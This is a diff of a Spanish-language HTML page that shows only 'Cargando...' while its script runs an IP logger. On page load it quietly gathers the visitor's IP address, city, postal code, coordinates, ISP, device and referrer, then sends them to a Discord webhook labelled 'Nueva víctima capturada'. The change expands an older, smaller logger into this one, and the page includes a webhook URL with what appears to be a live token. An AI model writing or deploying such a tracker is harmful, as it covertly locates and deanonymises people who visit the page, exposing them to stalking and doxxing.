@@ -1,40 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-<title>Loading...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cargando...</title>
 </head>
 <body>
+<p>Cargando...</p>
+
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1569613360851456091/tc0NgWa-nRvs4G8eMCNQX6JPPUnooMKi5vkgrbZkjnajIGI2z3b-1rYPa_2nj6XEKoe0";
 
-fetch("https://api.ipify.org?format=json")
-  .then(r => r.json())
-  .then(data => {
-    const ip = data.ip;
-    const ua = navigator.userAgent;
-    const lang = navigator.language;
-    const screen = `${window.screen.width}x${window.screen.height}`;
-    const time = new Date().toUTCString();
+async function capturar() {
+  const ipRes = await fetch("https://api.ipify.org?format=json");
+  const ipData = await ipRes.json();
+  const ip = ipData.ip;
 
-    fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        embeds: [{
-          title: "🌐 Nueva víctima",
-          color: 0xff0000,
-          fields: [
-            { name: "IP", value: `\`${ip}\``, inline: true },
-            { name: "Hora", value: time, inline: false },
-            { name: "User-Agent", value: `\`${ua}\``, inline: false },
-            { name: "Idioma", value: lang, inline: true },
-            { name: "Pantalla", value: screen, inline: true }
-          ]
-        }]
-      })
-    });
+  const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+  const geo = await geoRes.json();
+
+  const ua = navigator.userAgent;
+  const lang = navigator.language;
+  const screen = `${window.screen.width}x${window.screen.height}`;
+  const time = new Date().toUTCString();
+  const ref = document.referrer || "directo";
+
+  const ciudad = geo.city || "desconocido";
+  const region = geo.region || "desconocido";
+  const pais = geo.country_name || "desconocido";
+  const isp = geo.org || "desconocido";
+  const lat = geo.latitude || "?";
+  const lon = geo.longitude || "?";
+  const zip = geo.postal || "?";
+  const timezone = geo.timezone || "?";
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      embeds: [{
+        title: "🎯 Nueva víctima capturada",
+        color: 0xFF0000,
+        fields: [
+          { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+          { name: "🕐 Hora", value: time, inline: false },
+          { name: "🏙️ Ciudad", value: ciudad, inline: true },
+          { name: "🗺️ Región", value: region, inline: true },
+          { name: "🌍 País", value: pais, inline: true },
+          { name: "📮 Código Postal", value: zip, inline: true },
+          { name: "🕓 Zona Horaria", value: timezone, inline: true },
+          { name: "📡 ISP / Proveedor", value: isp, inline: false },
+          { name: "📍 Coordenadas", value: `${lat}, ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`, inline: false },
+          { name: "💻 Dispositivo", value: `\`${ua}\``, inline: false },
+          { name: "🗣️ Idioma", value: lang, inline: true },
+          { name: "🖥️ Pantalla", value: screen, inline: true },
+          { name: "🔗 Referrer", value: ref, inline: false }
+        ],
+        footer: { text: "IP Logger" }
+      }]
+    })
   });
+}
+
+capturar().catch(() => {});
 </script>
-<p>Cargando...</p>
 </body>
 </html>
